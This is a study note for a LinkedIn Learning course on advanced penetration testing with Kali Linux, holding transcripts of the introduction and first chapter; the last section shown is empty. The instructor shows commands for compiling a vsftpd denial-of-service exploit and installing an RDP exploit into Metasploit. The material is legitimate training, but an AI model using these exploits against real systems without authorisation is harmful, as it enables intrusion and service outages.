---
type: course
cssclasses:
  - lle-course
  - lle-level-advanced
slug: kali-linux-for-advanced-pen-testing-and-ethical-hacking
url: "https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking"
duration_minutes: 164
duration: 2h 44m
level: Advanced
updated: 9/3/2024
learners: 13696
skills:
  - Penetration Testing
  - Ethical Hacking
  - Kali Linux
exercise_files: true
thumbnail: "https://media.licdn.com/dms/image/v2/C4E0DAQH8rqHfztTzfw/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1639417323558?e=2147483647&amp;v=beta&amp;t=N1tnavHLaR2qVBXDm20jYQZd4wjZpkP6-ex8j3dL3Kw"
linkedin_topic: Cybersecurity
learning_paths:
  - '[[Become a Penetration Tester]]'
prev_courses:
  - '[[Penetration Testing Essential Training]]'
next_courses:
  - '[[Penetration Testing Web Apps with Kali and Burp Suite]]'
path_nav: '[{"path":"Become a Penetration Tester","position":4,"total":8,"prev":"Penetration Testing Essential Training","next":"Penetration Testing Web Apps with Kali and Burp Suite"}]'
path_count: 1
tags:
  - course
  - topic/security
  - skill/penetration-testing
  - skill/ethical-hacking
  - skill/kali-linux
status: not-started
created: 2026-05-03
---

> <!-- lle:github-source --> [View this note on GitHub](https://github.com/thisis-romar/linkedin-learning-vault/blob/github-browse/Courses/Cybersecurity/Kali%20Linux%20for%20Advanced%20Pen%20Testing%20and%20Ethical%20Hacking.md)

![Kali Linux for Advanced Pen Testing and Ethical Hacking](https://media.licdn.com/dms/image/v2/C4E0DAQH8rqHfztTzfw/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1639417323558?e=2147483647&amp;v=beta&amp;t=N1tnavHLaR2qVBXDm20jYQZd4wjZpkP6-ex8j3dL3Kw)

# Kali Linux for Advanced Pen Testing and Ethical Hacking

> Kali Linux is the penetration-testing professional's main tool, and includes hundreds of modules for scanning, exploitation, payloads, and post exploitation. In this course, Malcolm Shore teaches you advanced pen testing with Kali, including stealthy testing, privilege escalation, and pivoting. Learn how to use the basic toolset and extend Kali, integrating native exploits into the Metasploit envi

> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking) | 2h 44m | Advanced | 14K learners
> [Jump to Path Context ↓](#path-context)

## Table of Contents

### Chapter Overview

- [**Introduction**](#introduction) (3 videos)
  - [Using Kali Linux as the basis for advanced penetration testing](#using-kali-linux-as-the-basis-for-advanced-penetration-testing)
  - [What you should know](#what-you-should-know)
  - [Disclaimer](#disclaimer)
- [**1. Kali Basics**](#1-kali-basics) (6 videos)
  - [Testing with Kali Linux](#testing-with-kali-linux)
  - [Understanding Kali deployments](#understanding-kali-deployments)
  - [Preparing your toolbox](#preparing-your-toolbox)
  - [Preparing to use exploits for testing](#preparing-to-use-exploits-for-testing)
  - [Managing the Kali menu](#managing-the-kali-menu)
  - [Using the LinkedIn Learning penetration testing lab](#using-the-linkedin-learning-penetration-testing-lab)
- [**2. System Shells**](#2-system-shells) (6 videos)
  - [Introduction to shells](#introduction-to-shells)
  - [Exploring Kali webshells](#exploring-kali-webshells)
  - [Weeving a shell](#weeving-a-shell)
  - [Generating shellcode with msfvenom](#generating-shellcode-with-msfvenom)
  - [Injecting images with jhead](#injecting-images-with-jhead)
  - [Using shellcode in exploits](#using-shellcode-in-exploits)
- [**3. Exploiting Targets from Kali**](#3-exploiting-targets-from-kali) (5 videos)
  - [Exploiting systems with Kali](#exploiting-systems-with-kali)
  - [Exploiting with Python](#exploiting-with-python)
  - [Exploiting with Perl](#exploiting-with-perl)
  - [Exploiting with C](#exploiting-with-c)
  - [Exploiting with CPP](#exploiting-with-cpp)
- [**4. Passwords**](#4-passwords) (2 videos)
  - [Obtaining Windows passwords](#obtaining-windows-passwords)
  - [Obtaining Linux passwords](#obtaining-linux-passwords)
- [**5. Exploiting the Metasploitable Server**](#5-exploiting-the-metasploitable-server) (9 videos)
  - [Targeting Metasploitable](#targeting-metasploitable)
  - [Exploiting VSFTPD](#exploiting-vsftpd)
  - [Exploiting with ProFTPD](#exploiting-with-proftpd)
  - [Exploiting Tomcat](#exploiting-tomcat)
  - [Exploiting IRC](#exploiting-irc)
  - [Exploiting the distributed compile system](#exploiting-the-distributed-compile-system)
  - [Exploiting network files](#exploiting-network-files)
  - [Hiding in plain sight](#hiding-in-plain-sight)
  - [Escalating to root](#escalating-to-root)
- [**6. End-to-End Testing**](#6-end-to-end-testing) (6 videos)
  - [Starting with online labs](#starting-with-online-labs)
  - [Exploiting rejetto](#exploiting-rejetto)
  - [Exploiting the Devel](#exploiting-the-devel)
  - [Time to exploit Cronos](#time-to-exploit-cronos)
  - [Cronos revisited: Getting to the root](#cronos-revisited-getting-to-the-root)
  - [Using a nightmare escalator](#using-a-nightmare-escalator)
- [**7. Crafting Exploit Scripts**](#7-crafting-exploit-scripts) (5 videos)
  - [Introducing kali-autopilot](#introducing-kali-autopilot)
  - [Scripting a juicy attack](#scripting-a-juicy-attack)
  - [Attacking the juice shop](#attacking-the-juice-shop)
  - [Hiving into Windows](#hiving-into-windows)
  - [Attacking the hives](#attacking-the-hives)
- [**8. Command and Control with Sliver**](#8-command-and-control-with-sliver) (2 videos)
  - [Install Sliver server](#install-sliver-server)
  - [Implement a Sliver agent](#implement-a-sliver-agent)
- [**Conclusion**](#conclusion) (1 videos)
  - [Next steps](#next-steps)

### Introduction

[↑ Back to Table of Contents](#table-of-contents)

#### [Using Kali Linux as the basis for advanced penetration testing](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-kali-linux-as-the-basis-for-advanced-penetration-testing?u=76281980&t=0)** - [Instruction] [[Penetration Testing]] is an activity which requires a solid foundation of [[Ethical Hacking]] using pre-built tools. Augmented with an ability to create fit for purpose exploits to test deeper into target systems. A pen tester needs to keep up to date with emerging tools and techniques, and be able to rapidly take exploitation concepts and produce working modules that can deliver irrefutable testing evidence using tests that can be reproduced. [[Kali Linux]] is an important tool for the pen tester, providing a common testing platform for many hundreds of testing tools. Its extensible and configurable and is well-supported. Being skilled in using Kali and the tools it contains makes a significant contribution to a pen tester's professionalism and ability to carry out an effective job. Having a deep practical knowledge of Kali provides the launch pad for a great pen testing career. I'm Malcolm Shaw. And during my career in government and industry, I performed, managed, and taught exploit development, penetration testing, and reverse engineering. I'd like to invite you to take this course and learn about some of the more advanced features of Kali Linux. Now let's get started with Advanced Kali Linux.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Kali Linux]] (3), [[Penetration Testing]] (2), [[Ethical Hacking]] (1)
> **Definitions:** is an  (2)
> **Speakers:** - [instruction] (1)

#### [What you should know](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/what-you-should-know?u=76281980&t=0)** - [Instructor] This is a practical course. And during this course, I'll be using a VirtualBox test network, containing the Kali platform and a variety of test targets. I'll also be using two online test labs, the Offensive Security Proving Grounds and Hack The Box. This is an advanced course, and you'll need to have a good working knowledge of Kali and some hands-on experience of [[Ethical Hacking]]. I'll be looking at advanced features of Kali, which build on an assumed basic level of knowledge. I'll be using exploit code in [[Python (Programming Language)|Python]], C, C++, and Perl to demonstrate exploit development. You should have a basic ability in these languages or at least be able to follow the general gist. Pen testing is a challenging pursuit. You should be competent in [[Windows]] and [[Linux]] host technologies, as well as having a good grasp of network protocols.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Ethical Hacking]] (1), [[Python (Programming Language)|Python]] (1), [[Windows]] (1), [[Linux]] (1)
> **Definitions:** is a  (2), is an  (1)
> **CLI Commands:** python (1)
> **Prerequisites:** you'll need (1)
> **Speakers:** - [instructor] (1)

#### [Disclaimer](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/disclaimer?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/disclaimer?u=76281980&t=0)** - [Instructor] This course uses a range of third-party testing tools. Some are commercial [[Microsoft Products|products]] and some are open source. The download and installation instructions for all tools used in this course are available as a PDF in the associated course material. While we've done our best to ensure that the tools we use and the sites we reference are legitimate, testing sites can be targets for hackers, and we can't provide any assurance that these sites might not be compromised when you visit them. Some of the sites which store the testing tools, are detected as dangerous because the tools have similar signatures to malware and may raise antivirus alerts, when you visit them. The testing tools we demonstrate are extremely powerful. They may have some of the same signature characteristics as malware and malicious implants and may raise antivirus alerts, when you try to download them. Again, we can't provide assurance that the software hasn't been compromised when you download it. And so, as for any other software from the internet, you need to exercise due diligence and take personal responsibility for anything you load into your system.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Microsoft Products|Products]] (1)
> **Env Vars:** pdf (1)
> **Speakers:** - [instructor] (1)


### 1. Kali Basics

[↑ Back to Table of Contents](#table-of-contents)

#### [Testing with Kali Linux](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=0)** - [Instructor] Kali is major part of any pen tester's approach to testing, both as a platform to work from and a source of tools to use. The nature of system vulnerabilities means that the pen tester is faced with a range of operating systems and applications. And for each of them, a variety of release levels. Technology changes quickly but can persist for a long time. And technology users differ widely in their attention to applying patches and updates. Consequently, running a pen test requires a lot of preparation to determine what might be the right tools and exploits to use, and to manage the uncertainty that comes with using tools and exploits in an uncertain environment. Offensive Security, the folks who provide Kali for us, have a range of training courses, the most well-known of which is Pen 200, pen testing with Kali, which is the training course for the [[OSCP]] Certified Professional examination. This is the most widely recognized qualification in the pen testing world. Pen 200 includes a training manual and videos to provide a basic level of understanding and a training lab in which to spend many hours attempting system penetrations in order to direct research and build experience. As well as learning the approaches to specific system penetrations, it's as much as anything an opportunity to develop an effective personal style. Pen testing is not about cooking up tests from a recipe book,
>
> **[1:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=92)** which contains the perfect solution for every target. Exploits are continually being developed and the combination of configurations and software makes every target a unique challenge. Pen testing, therefore, is about understanding the target, being able to creatively identify potential weak spots and then being able to craft a unique set of tests to suit the target. We can create labels such as script kiddies, cyber warriors, exploiters and so on but in fact, there are no preordained levels of pen tester, just a continuum from beginner to expert. Everyone starts out knowing nothing but depending upon the time and effort they invest in learning, they can become competent pen testers. As with any other endeavor, some people will have more aptitude and learn faster but it is just about plain old learning and experience. There's no magic here. A novel pen tester will be able to run automated tools to find vulnerabilities, and in some cases, to automate the collection of penetration evidence. The challenge gets harder the more obscure the target software. At a more advanced level, exploits may exist but need to be customized to suit the target. And so a level of reverse engineering is required. At the expert level, the pen tester will carry out vulnerability research on his or her targets to find zero-day exploits and craft specific attacks. Anyone wanting to learn pen testing can become a competent advanced tester.
>
> **[3:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=186)** The key learning in becoming a competent pen tester is persistence, and the OSCP motto, and examination demand is try harder. Pen testers will need to have a broad range of skills across networks, operating systems and common applications. Most testers will then develop their skills in specific areas, such as wireless networks, specific operating systems, such as [[Windows]] or [[Linux]], specific services such as web and mobile, or specific applications, such as [[Active Directory]]. There are also some specialized areas outside of mainstream IT, such as [[SCADA]] systems, control systems used in areas, such as power stations and other utilities. The explosion in technology that is occurring with the [[IoT|Internet of Things]] means there'll be many more specialized areas. Home automation, transport and automotive, industrial automation, e-health devices and so on. Developing as a pen tester also means developing your own approach to testing. And learning how to manage the vast amounts of pen testing knowledge that you acquire. Getting yourself ready to do pen testing by creating your own toolbox of useful tools and techniques is as much a part of training to be a pen tester as is learning about specific exploits. Kali supports the pen testing process by providing an effective pen testing environment right from the start, enabling quick wins, and reproducible results. It also provides the foundation for you
>
> **[4:39](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/testing-with-kali-linux?u=76281980&t=279)** to develop your own advanced toolset by extending it to suit your own way of working.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[OSCP]] (2), [[Windows]] (1), [[Linux]] (1), [[Active Directory]] (1), [[SCADA]] (1)
> **Analogies:** such as (7)
> **Env Vars:** oscp (2), scada (1)
> **CLI Commands:** find (2)
> **Speakers:** - [instructor] (1)

#### [Understanding Kali deployments](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=0)** - There are a number of ways to deploy Kali. As a [[Hardware]] deployed system and as a virtual machine being the most popular. While Kali is usually deployed on standard x86 laptop hardware, it can also be deployed on an increasing number of other platforms, such as ARM-based tablets. A special configuration of Kali for a range of [[Android]] devices has been released, known as Kali NetHunter. And this is designed to be used for [[Wi-Fi|wifi]] and radio based testing. Kali is a special build of [[Ubuntu]] and deploys onto bare metal as a standard [[Linux]] system. The downside of being a hardware based deployment is that any changes made, which destabilize the system, may be difficult to roll back. In addition, any malware that infiltrates the system will remain until it's detected. And should the system be connected to a customer network, the malware may jump across. Virtualization has become a common approach to running systems with cloud-based [[Virtual Machines]], making up the majority of enterprise service solutions. In premise systems, are now usually delivered using virtualization. Unsurprisingly, virtualization has also become popular in pen testing. And Kali is available as either a virtual box or a VMware image. The Kali VM operates exactly as a Kali image deployed directly onto hardware does. However, with a virtual machine, it's possible to take snapshots of the system from time to time to provide easy roll back to a known good point.
>
> **[1:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=94)** Having deployed Kali as a virtual image means that the impact of testing tools can be more easily contained within a virtual network. Should a testing tool be accidentally misconfigured, potentially high impact testing may be run on an unintended target across the local LAN or the internet. An isolated virtual test network will ensure potentially destructive activities contained. Isolating the test network can also be useful for testing new exploits and tools. The impact and visibility of testing can be monitored in the virtual environment prior to letting them loose in the internet or a corporate network. When researching potential exploits for a target, we may need to download code. Sometimes source code is posted on the internet, which is deliberately designed to destroy the system it runs on. Not very sensible, nor mature, but a fact of life for pen testers. The use of machine code and encrypted payloads in source code can make it very difficult to determine whether the exploit is safe. Running as a VM means that even if the VM is destroyed by malware, it can be easily recovered from the VM image or a snapshot. A live deployment is one in which the Kali system runs from bootable media, such as a USB drive. And is enabled to make permanent changes to the media. Any changes applied during a session will not persist when the system is restarted. This makes live deployments ideal for executing the more hostile tests and ensuring that the test platform
>
> **[3:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/understanding-kali-deployments?u=76281980&t=187)** always starts up in a known and safe state. The downside, however, is that any new software loaded or any operating system upgrades applied, will not persist. There is a variant to the live deployment, which does allow persistence by storing a copy of the Kali image in a persistent data partition on the USB drive. This has to be done manually as shown in the offensive security site here. The normal way to use Kali in a training environment is via virtual image. However, you might want to install Kali as a bare metal alternative boot option, for production.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Hardware]] (4), [[Android]] (1), [[Wi-Fi|Wifi]] (1), [[Ubuntu]] (1), [[Linux]] (1)
> **Definitions:** is a  (2), means that (2), known as (1)
> **Env Vars:** usb (2), arm (1), lan (1)
> **CLI Commands:** make (2)
> **Exercise Files:** source code (2)
> **Analogies:** such as (2)
> **Prerequisites:** install (1)
> **Speakers:** - there (1)

#### [Preparing your toolbox](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=0)** - [Lecturer] As a pen tester, you need to develop the technical skills to test systems. And as part of that, you need to develop and maintain your personal toolkit, and manage your approach to testing. You'll need tools to carry out specific techniques, such as scanning or enumeration, which you'll use as part of the reconnaissance phase of your work, exploitation tools and post exploitation tools for such things as tunneling and maintaining persistence. Kali is a great platform for these tools and comes with much of what you'll need pre-loaded. You'll need to manage how you access the thousands of exploits, which can be sent to a target in order to achieve a scan, a penetration, or a privilege escalation. Effective management of and rapid access to these exploits is critical for taking the OFCCP examination, as well as ensuring high professional performance as a pen tester, to achieve this, you need to go beyond the search capabilities, built into the various exploit [[Databases]]. Another set of components you'll want to manage is shells, which you can upload to a target directly, or as parts of an exploit. These are needed to be able to provide the evidence that the target is penetrable. Generic shells exist, but you'll need to prepare your own likely on a per engagement or per exam basis. Finally, you'll need to have a strategy for documenting the pen testing results as you're working on it to avoid reworking areas, to obtain the evidence needed,
>
> **[1:34](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=94)** to produce test reports. Beyond this feeding test results back into your exploit database will help enrich the exploits with good intelligence about what does and what doesn't work. Kali includes over 600 tools and it can prove difficult remembering which tools do what and how to access them. Fortunately, Kali stores tools in a well-structured folder system and provides easy access to them through an application menu. Many of Kali's tools are held in user share. Let's take a look, ls/usr/share. We can say there's a lot of tools here. Let's check how many folders we currently have here. ls/usr/share -1 |wc -1.
>
> **[2:28](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=148)** Okay, we have 339 folders with one or more tools in each. However, not all of the tools are in user share as some come as part of the [[Linux]] distribution. One of the tools we may want to use is SPD. We can run this to check its version. SBD minus V. When we look in user share, we can't find it ls/usr/share/sbd. In fact, this is in user bin, ls/usr/bin/sbd.
>
> **[3:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=186)** Kali includes many of the tools that you'll use as a pen tester, but the standard distribution makes some trade-offs between distribution size and the number of tools available. Many of these additional tools will be quite specific in where they can be used, for instance, with specific video cards. However, if you're prepared to invest more disc space in getting the complete set of tools, you can update your Kali system to include all tools. You can do this with the command sudo apt install, kali-linux-all, this will include a further four gigabytes or so of software. I won't run this right now, but if you're interested, then you can run this when you have the time to explore some of the rarer tools, even with a complete set of Kali tools, there are more tools continually being developed. You may wish to develop your own tools and include them in Kali. We can create new folders and load additional tools into user share. Let's see how we do this by adding one of the tools we might want to use. The Joomlal scanner, JoomScan, doesn't come as standard with Kali. Let's add it. Okay, we'll go to /usr/share and we'll sudo [[Git]] clone
>
> **[4:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=275)** https:// [github.com/OWASP/joomscan.git](https://github.com/OWASP/joomscan.git).
>
> **[4:49](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-your-toolbox?u=76281980&t=289)** Okay, that's done. Now we can run this, cd joomscan, perl joomscan.pl and we'll just run for the version. Version 0.0.7. The key step in training for [[OSCP]] or preparing for pen testing assignment is to make sure all the tools you need are loaded and ready to go. You'll likely find tools which are useful outside of Kali and spending a bit of time preparing them for use is a good investment.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Linux]] (2), [[Git]] (2), [[Databases]] (1), [[GitHub]] (1), [[OWASP]] (1)
> **CLI Commands:** ls (4), find (2), sudo (2), git (2), apt (1)
> **Prerequisites:** you'll need (5), install (1)
> **Env Vars:** ofccp (1), spd (1), sbd (1), owasp (1), oscp (1)
> **Versions:** version 0 (1), 0.7 (1)
> **Definitions:** is a  (2)
> **Analogies:** such as (1), for instance (1)
> **URLs:** [github.com](https://github.com) (1)

#### [Preparing to use exploits for testing](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=0)** - [Instructor] There are tens of thousands of exploits available from a wide variety of sources. As a professional pen tester, you'll want to review and test a number of these exploits before deploying them on assignments and then maintain your own structured repository of exploits. The most important online source is Offensive Security's Exploit Database shown here. There's currently over 38,000 exploits. The homepage shows the most recent exploits first. And we can filter on the four categories of exploits, denial of service, local exploits, remote exploits, and web application exploits. We can filter on exploit platform and language. And we can filter on the type of tag on the exploit. [[Exploit-DB]] also maintains lists for exploit shell codes and papers. The exploits database can be downloaded or we can browse it online. Let's select remote exploits. The list shows the date that the exploit was registered and the three columns D, A, and V. The D column is a download of the exploit code, and the A column allows us to download the application. The V column indicates whether the exploit has been verified. Kali maintains a copy of the Exploit-DB files and includes a tool called SearchSploit, which can be used to access specific exploits.
>
> **[1:33](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=93)** These will often need to be prepared for use. As an example, let's search for an exploit for the vsftpd server. searchsploit vsftpd. Okay, we can see we have seven exploits available. The common path is /usr/share/[[Exploit-DB|exploitdb]]/exploits/ and the specific extension is on the right of the exploit. Let's get the denial of service exploit and prepare it. We'll copy /usr/share/exploitdb /exploits/[[Linux]]/dos/16270.c.
>
> **[2:21](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=141)** And we'll copy that to 16270.c. We can now have a look at it and see what it's doing and see how to run it. nano 16270.c. Okay, we can see that we'll call it with an IP address and port and with a username and a password. Further down, we can see that it will use anonymous login if we don't specify the credential. Okay, let's build this. gcc -o 16270 16270.c.
>
> **[3:02](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=182)** Okay, we get a warning, but we can see that it's built. Many exploits will be generally useful across all pen tests, while some will be more specific. You'll need to develop your own strategy for what you retain at hand and what you plan to pick up from the internet when you need it. You won't want to have to trawl through more than 30,000 exploits when you're testing. You'll want to have at hand the top few dozen that give you a quick win. It's important to prepare these exploits in advance and then manage them in a way which allows easy access to them when doing pen tests. Let's start up [[Metasploit]]. Kali includes over 2,100 exploits in the Metasploit framework. These provide most of what we'll need when testing, but on occasion, we'll need more. We can extend Metasploit with other exploits if we have them available as Ruby modules. Let's look at how we do that. If I search for an exploit called EsteemAudit, we'll do a search esteem, there are no results. EsteemAudit can be downloaded in Ruby form for Metasploit from the BlackMathIT site in [[GitHub]]. We can also load it into Kali by cloning it. We'll [[Git]] clone [https://github.com/BlackMathIT](https://github.com/BlackMathIT)/
>
> **[4:37](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=277)** Esteemaudit-Metasploit.git. Okay, that's loaded, so let's now check it out. ls Esteemaudit-Metasploit. We need to put the Ruby file into our local Metasploit folder, which is .msf4. EsteemAudit is a [[Windows]] RDP attack, so we'll copy the Ruby code across into the exploits/windows/rdp folder. cd .msf4/modules. We'll mkdir exploits and go into exploits. We'll mkdir windows, and we'll change directory to windows. We'll mkdir rdp, and we'll go into rdp, and we'll copy our Esteemaudit-Metasploit/
>
> **[5:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=344)** esteemaudit Ruby file into this folder. We need to make one adjustment to this code, so let's go into nano esteemaudit.rb.
>
> **[6:02](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=362)** And we'll change the esteemaudit folder to home/kali/.msf4/esteemaudit,
>
> **[6:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=374)** and we'll save that. Okay, we now have to make the folder and copy the file contents into it. So let's mkdir ~/.msf4/esteemaudit,
>
> **[6:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=392)** and we'll copy Esteemaudit-Metasploit/files
>
> **[6:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=400)** everything in the files folder to .msf4/esteemaudit. And now we'll update the Metasploit database. updatedb. sudo updatedb. Okay, we're now good to go. Let's go back into Metasploit and see what it looks like. [[Metasploit|msfconsole]]. When we search for esteem, and we can see the number of exploits have increased by one. Use exploit/windows/rdp/esteemaudit. And we can see that we can use it. Show options. And we can see it's configured with the Metasploit parameters and targets thanks to the BlackMathIT folks. There are many other exploits which we might want to use but aren't available in Metasploit. While there's a lot of safe exploit code available from GitHub and many other sites, not all of the sites are trustworthy. You need to be careful using exploits unless you understand what they do, at least to the point of knowing they're not malicious. If you look at the code and it has a payload which includes a sequence, such as hex72, 6D, 20, then you probably want to think twice about running the code
>
> **[8:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/preparing-to-use-exploits-for-testing?u=76281980&t=492)** as there are not many legitimate exploits remove all your root files.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Metasploit]] (13), [[Windows]] (5), [[GitHub]] (3), [[Exploit-DB]] (2), [[Exploit-DB|Exploitdb]] (2)
> **CLI Commands:** ruby (5), mkdir (4), git (2), make (2), ls (1)
> **File Paths:** 16270.c (3), exploits/linux/dos/16270.c (1), esteemaudit.rb (1)
> **Tools:** github (3)
> **Definitions:** is a  (2)
> **Warnings:** warning (1), be careful (1)
> **URLs:** [https://github.com/blackmathit](https://github.com/blackmathit) (1)
> **Env Vars:** rdp (1)

#### [Managing the Kali menu](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980&t=0)** - [Instructor] Kali has a preset application menu and also has a top customizable panel. At the left are a set of common use items and at the right a set of system items. We can modify this to suit our own needs. We can right click the Panel and select Panel, Panel Preferences. We can see in the initial Display tab that the Panel is horizontal, unlocked, has one row, 30 pixels high. However, we're interested in the Items tab. When we press that, we see a number of entries, including Separators. And these correspond to the items in the Panel. The Whisker Menu is our Kali application menu icon and the five Launcher items represent the five common use applications we have showing. Let's move the fifth item down to between the two Separators. We can see the Cherry Tree item on the panel moves right. Let's remove it. We'll confirm and it's gone. To add an item we press Add and an item selection panel appears. Let's select Launcher and Add, notice that when we do that, a Launcher icon has appeared on the right of the top panel. Okay, let's close the Add New Items panel. And in Panel Preferences,
>
> **[1:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980&t=92)** let's scroll down to the bottom and we find the Launcher icon. Let's select it and move it up to where Cherry Tree was. Let's now select the stacked lines icon to the right of remove and we see the Launcher panel appears, we'll select plus
>
> **[1:59](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980&t=119)** and scroll down and we can find Cherry Tree and we'll add that and close. And we can close the Panel Preferences. We can see that Cherry Tree is now back in our common use items. We can also modify the main Whisker application menu. The easiest way to do this is to install an application called Alacarte. We can do that using apt as normal, sudo apt install alacarte and we'll install that.
>
> **[2:43](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980&t=163)** Okay, let's select the Application menu, Usual Applications,
>
> **[2:51](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980&t=171)** Accessories and we have a Main Menu item now. It's the Alacarte Menu. This brings up the Alacarte Menu Manager. At the left let's select Web Application, Web Crawlers and Directory Bruteforce. In the middle panel, we can see [[Dirb]] and dirbuster, but not [[Gobuster]], lets add it. It will select New Item, we'll call it gobuster and for the command, we need to enter a special form of launch by saying /user/share/kali.menu/exec.in.shell
>
> **[3:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/managing-the-kali-menu?u=76281980&t=220)** and we'll execute gobuster and we'll select Launch in Terminal. Okay that's it, we can close this and we see gobuster appears here. Let's just move it up one, two, be next to dirbuster and we can close this. Now, when we go to our Application Menu, Web Applications, Web Crawlers and Directory Bruteforce, we can see gobuster and it comes up with it's help.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Gobuster]] (5), [[Dirb]] (1)
> **CLI Commands:** find (2), apt (2), sudo (1)
> **UI Navigation:** scroll down (2), select the (2), go to (1)
> **Prerequisites:** install (3)
> **Tools:** terminal (1)
> **Speakers:** - [instructor] (1)

#### [Using the LinkedIn Learning penetration testing lab](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/using-the-linkedin-learning-penetration-testing-lab?u=76281980)

> [!transcript]- Transcript
>
